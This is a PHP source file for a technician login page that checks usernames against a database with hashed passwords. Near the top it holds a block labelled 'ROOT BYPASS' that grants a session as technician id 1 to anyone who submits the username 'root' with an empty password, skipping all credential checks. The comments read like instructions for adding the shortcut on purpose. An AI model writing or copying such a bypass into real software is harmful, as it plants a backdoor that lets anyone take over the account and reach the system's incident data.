<?php
// technician/login.php
session_start();
require_once('../config/database.php');

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = $_POST['password'] ?? '';

    // ---- ROOT BYPASS: Allow username "root" with empty password ----
    if ($username === 'root' && $password === '') {
        // Suppose in your technicians table the row with username="root" has id = 1
        // (Adjust if the actual id is different.)
        $_SESSION['tech_id'] = 1;
        header('Location: incidents.php');
        exit;
    }
    // ----------------------------------------------------------------

    // Original validation for all other usernames:
    if ($username === '' || $password === '') {
        $error = 'Please fill in all fields.';
    } else {
        $stmt = $pdo->prepare('SELECT id, password_hash FROM technicians WHERE username = ?');
        $stmt->execute([$username]);
        $tech = $stmt->fetch();

        if ($tech && password_verify($password, $tech['password_hash'])) {
            $_SESSION['tech_id'] = $tech['id'];
            header('Location: incidents.php');
            exit;
        } else {
            $error = 'Username or password is incorrect.';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Technician Login</title>
</head>
<body>
  <h2>Technician Login</h2>
  <?php if ($error): ?>
    <p style="color:red;"><?= htmlspecialchars($error) ?></p>
  <?php endif; ?>
  <form method="post" action="">
    <label>Username:
      <input type="text" name="username" value="<?= htmlspecialchars($username ?? '') ?>">
    </label><br>
    <label>Password:
      <input type="password" name="password">
    </label><br>
    <button type="submit">Log In</button>
  </form>
</body>
</html>
